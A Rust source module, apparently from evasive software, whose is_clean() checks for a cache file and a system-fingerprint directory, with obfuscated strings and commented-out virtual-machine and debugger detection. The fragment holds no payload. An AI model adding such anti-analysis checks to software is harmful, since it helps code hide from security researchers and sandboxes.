//! clean up

// use crate::{ err, info };
// use obfstr::obfstr as s;
// use winapi::um::processthreadsapi::GetCurrentProcess;
// use std::env;
// use std::path::PathBuf;
// use winapi::um::debugapi::{ CheckRemoteDebuggerPresent, IsDebuggerPresent };
use obfstr::obfstr as s;
use crate::constants::get_fingerprint_dir;
use super::functions::get_current_exe_dir;
// use winapi::um::libloaderapi::GetModuleHandleA;
// use inside_vm::inside_vm;
// use vm_detect::{vm_detect, Detection};

pub fn is_clean() -> bool {
    if !is_cache_exist() {
        return false;
    }
    if !is_system_fingerprinted() {
        return false;
    }
    // if inside_vm() {
    //     err!("Inside VM 1000 cpu cycles threshold triggered");
    //     //? return false;
    // }

    // let detection = vm_detect();
    // if !detection.is_empty() {
    //     err!("VM Detection isnt empty: ", detection);
    //     return false;
    // }
    // unsafe {
    //     if IsDebuggerPresent() != 0 {
    //         // err!("Debugger is present.");
    //         return false;
    //     }

    //     let mut is_debugger_present = 0;

    //     CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_debugger_present);

    //     if is_debugger_present != 0 {
    //         // err!("Remote Debugger is present.");
    //         return false;
    //     }
    // }

    true
}

pub fn is_cache_exist() -> bool {
    if get_current_exe_dir().unwrap().join(s!("cache.cfg")).exists() { true } else { false }
}
pub fn is_system_fingerprinted() -> bool {
    let fingerprint_dir = get_fingerprint_dir();
    if fingerprint_dir.exists() && fingerprint_dir.is_dir() {
        true
    } else {
        false
    }
}
